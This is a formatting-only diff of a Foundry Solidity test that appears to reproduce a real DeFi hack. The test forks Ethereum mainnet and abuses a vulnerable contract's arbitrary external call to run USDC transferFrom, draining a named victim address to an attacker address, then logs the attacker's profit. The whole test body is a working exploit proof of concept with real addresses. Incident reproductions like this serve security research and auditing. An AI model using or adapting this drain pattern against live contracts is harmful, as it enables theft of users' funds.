@@ -12,17 +12,13 @@ import "forge-std/Test.sol";
 // https://twitter.com/Supremacy_CA/status/1590337718755954690
 
 contract Exploit is Test {
-    IWETH private constant WETH =
-        IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    IERC20 private constant USDC =
-        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
 
-    address private constant vulnerableContract =
-        0x0AD8229D4bC84135786AE752B9A9D53392A8afd4;
-    address private constant attacker =
-        0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6;
-    address private constant victim =
-        0x211B6a1137BF539B2750e02b9E525CF5757A35aE;
+    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+
+    address private constant vulnerableContract = 0x0AD8229D4bC84135786AE752B9A9D53392A8afd4;
+    address private constant attacker = 0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6;
+    address private constant victim = 0x211B6a1137BF539B2750e02b9E525CF5757A35aE;
 
     function testHack() external {
         vm.createSelectFork("https://rpc.builder0x69.io", 15_926_096);
@@ -34,41 +30,34 @@ contract Exploit is Test {
             address(WETH),
             0, // ?
             1, // ?
-            abi.encodeWithSelector(
-                IERC20.transferFrom.selector,
-                victim,
-                attacker,
-                USDC.balanceOf(victim)
-            )
+            abi.encodeWithSelector(IERC20.transferFrom.selector, victim, attacker, USDC.balanceOf(victim))
         );
 
-        (bool success1, ) = vulnerableContract.call(payload);
+        (bool success1,) = vulnerableContract.call(payload);
 
-        console.log(
-            "Attacker's profit: %s USDC",
-            USDC.balanceOf(attacker) / 1e6
-        );
+        console.log("Attacker's profit: %s USDC", USDC.balanceOf(attacker) / 1e6);
     }
+
 }
 
 /* -------------------- Interface -------------------- */
 interface IERC20 {
+
     function transfer(address to, uint256 amount) external returns (bool);
     function approve(address spender, uint256 amount) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint256 amount
-    ) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 
     function deliver(uint256 tAmount) external;
+
 }
 
 interface IWETH {
+
     function deposit() external payable;
     function transfer(address to, uint256 value) external returns (bool);
     function approve(address guy, uint256 wad) external returns (bool);
     function withdraw(uint256 wad) external;
     function balanceOf(address) external view returns (uint256);
+
 }
